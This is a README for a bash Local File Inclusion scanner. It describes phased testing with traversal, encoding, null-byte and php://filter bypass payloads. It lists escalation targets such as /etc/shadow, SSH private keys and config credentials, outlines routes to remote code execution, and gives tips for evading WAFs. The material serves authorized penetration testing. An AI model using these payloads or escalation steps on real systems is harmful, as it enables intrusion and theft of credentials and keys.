# LFI Vulnerability Scanner

An automated bash script to test for Local File Inclusion (LFI) vulnerabilities with iterative bypass testing capabilities.

## Overview

This scanner automates the process of testing web applications for LFI vulnerabilities by trying multiple bypass techniques and file targets. It progressively tests different attack vectors in four phases, from basic traversal to advanced PHP filter wrappers.

## Usage

```bash
./lfi_scanner.sh <URL> <PARAMETER>
```

### Parameters

- **`<URL>`**: The target web application URL (including the script/page name)
- **`<PARAMETER>`**: The vulnerable parameter name that will be tested for LFI

The **second parameter (`<PARAMETER>`)** is the name of the GET parameter in the URL that you suspect might be vulnerable to LFI. This is typically a parameter that the application uses to include or load files.

### Example

```bash
./lfi_scanner.sh "http://example.com/index.php" "language"
```

This will test the URL: `http://example.com/index.php?language=[PAYLOAD]`

Common vulnerable parameter names include:
- `file`
- `page`
- `include`
- `path`
- `document`
- `language`
- `view`
- `template`
- `load`

## How It Works

The scanner operates in four progressive phases:

### Phase 1: Basic LFI Test
Tests a simple directory traversal payload to check if basic LFI works without any filters:
```
../../../../etc/passwd
```

### Phase 2: Bypass Techniques
If basic LFI fails, it tries various filter bypass methods:

| Technique | Description | Example Payload |
|-----------|-------------|-----------------|
| **Non-recursive** | Bypasses filters that remove `../` once | `....//....//....//etc/passwd` |
| **Non-recursive alternative** | Another variant using mixed slashes | `..././..././..././etc/passwd` |
| **URL encoded** | Single URL encoding | `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd` |
| **Double encoded** | Double URL encoding | `%252e%252e%252f%252e%252e%252fetc/passwd` |
| **Approved path** | Prepends expected path | `./languages/../../../../etc/passwd` |
| **Null byte** | Bypasses extension appending (PHP < 5.3) | `../../../../etc/passwd%00` |
| **Extra slashes** | Mixed slash patterns | `..././..././..././etc/passwd` |
| **Deep traversal** | More directory levels | `../../../../../../../../../etc/passwd` |

### Phase 3: Alternative Target Files
If `/etc/passwd` is specifically blocked, tests other sensitive files:
- `/etc/hosts` - Network configuration
- `/etc/hostname` - System hostname
- `/proc/version` - Kernel/OS version
- `/windows/win.ini` - Windows configuration (for Windows targets)

### Phase 4: PHP Filter Wrappers
Tests PHP filter wrappers for source code disclosure:
```
php://filter/read=convert.base64-encode/resource=index
```

This can reveal PHP source code in base64 format, potentially exposing:
- Database credentials
- API keys
- Application logic
- Other sensitive information

## Features

- ✅ **Automated filter detection** - Identifies what type of filter is in place
- 🎯 **Multiple bypass techniques** - Tests various encoding and traversal methods
- 🔄 **Iterative testing** - Progressively tries more advanced techniques
- 📁 **Alternative file targets** - Tests multiple sensitive files
- 🐘 **PHP wrapper support** - Attempts source code disclosure
- 🎨 **Color-coded output** - Clear visual feedback with status indicators
- 🧹 **Auto cleanup** - Removes temporary files after execution

## Output Interpretation

### Success Indicators
```
[✓] SUCCESS! Basic LFI works - No filter detected
[✓] Working payload: ../../../../etc/passwd
[✓] Full URL: http://example.com/index.php?language=../../../../etc/passwd
```

### Filter Detection
```
[!] Filter detected: ../ strings are being removed
[!] Filter detected: .php extension is being appended
[!] Possible WAF/filter detected: Generic blocking message
```

### Final Report
The script provides a comprehensive final report including:
- Confirmation of vulnerability (if found)
- Working payload
- Full exploit URL
- Suggested next steps for further exploitation

## Success Criteria

The scanner validates successful LFI by checking for specific content in responses:

| Target File | Success Indicators |
|-------------|-------------------|
| `/etc/passwd` | Contains `root:` entries or `daemon:` |
| `/etc/hosts` | Contains `127.0.0.1` or `localhost` |
| `/windows/win.ini` | Contains `[fonts]` or `[extensions]` sections |
| `/proc/version` | Contains `Linux` or `kernel` keywords |
| PHP filters | Valid base64 content that decodes to PHP code |

## Next Steps After Finding LFI

If the scanner finds a vulnerability, consider these escalation paths:

1. **Sensitive File Disclosure**
   - `/etc/shadow` - Password hashes (requires root)
   - `/var/www/html/config.php` - Database credentials
   - `/home/*/.ssh/id_rsa` - SSH private keys
   - `/var/log/apache2/access.log` - Web server logs

2. **Source Code Disclosure**
   - Use PHP filter wrappers to read application source
   - Look for hardcoded credentials and secrets
   - Identify other vulnerabilities in the code

3. **Remote Code Execution**
   - **Log poisoning**: Inject PHP code into logs, then include the log file
   - **File upload + LFI**: Upload malicious file, include it via LFI
   - **Session file inclusion**: Include PHP session files with injected code
   - **RFI**: Test if `allow_url_include` is enabled for Remote File Inclusion

4. **Further Enumeration**
   - Map out the application's file structure
   - Identify configuration files and backups
   - Look for database files or credentials

## Security Considerations

⚠️ **Important Notes:**
- Only use this tool on systems you have explicit permission to test
- This is a penetration testing tool - unauthorized use is illegal
- Some bypass techniques may trigger security alerts or WAFs
- Log files will record your testing activities

## Prerequisites

- `bash` (version 4.0+)
- `curl` - For making HTTP requests
- `grep` - For pattern matching (usually pre-installed)
- `base64` - For decoding PHP filter responses (usually pre-installed)

## Limitations

- Only tests GET parameters (doesn't test POST, cookies, headers)
- Requires target response to contain recognizable success indicators
- May miss vulnerabilities with strict input validation
- Cannot bypass all types of WAFs or advanced filters
- Works best against PHP applications

## Troubleshooting

### No vulnerability detected but you suspect it exists

Try manual testing with:
```bash
curl "http://example.com/index.php?language=../../../../etc/passwd"
```

### WAF blocking requests

- Use a proxy like Burp Suite for manual testing
- Try adding legitimate User-Agent headers
- Slow down request rate
- Test from different IP addresses

### Different responses but no clear success

- Manually inspect the response files in `/tmp/lfi_scan_*`
- Look for partial file content or error messages
- Check response lengths and patterns

## Example Scenarios

### Scenario 1: Successful Basic LFI
```bash
$ ./lfi_scanner.sh "http://vulnerable.com/page.php" "file"

[✓] SUCCESS! Basic LFI works - No filter detected
[✓] Working payload: ../../../../etc/passwd
```

### Scenario 2: Filter Bypass Required
```bash
$ ./lfi_scanner.sh "http://vulnerable.com/index.php" "page"

[✗] Basic LFI blocked or unsuccessful
[!] Filter detected: ../ strings are being removed
[✓] SUCCESS with non_recursive!
[✓] Working payload: ....//....//....//....//etc/passwd
```

### Scenario 3: PHP Source Disclosure
```bash
$ ./lfi_scanner.sh "http://vulnerable.com/view.php" "file"

[✓] SUCCESS! PHP source code disclosure possible
[✓] Working payload: php://filter/read=convert.base64-encode/resource=index
```

## Legal Disclaimer

This tool is provided for educational and authorized security testing purposes only. Users are responsible for complying with all applicable laws and regulations. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing any system.

---

**Version:** 1.0  
**Author:** Security Testing Tool  
**License:** Educational Use
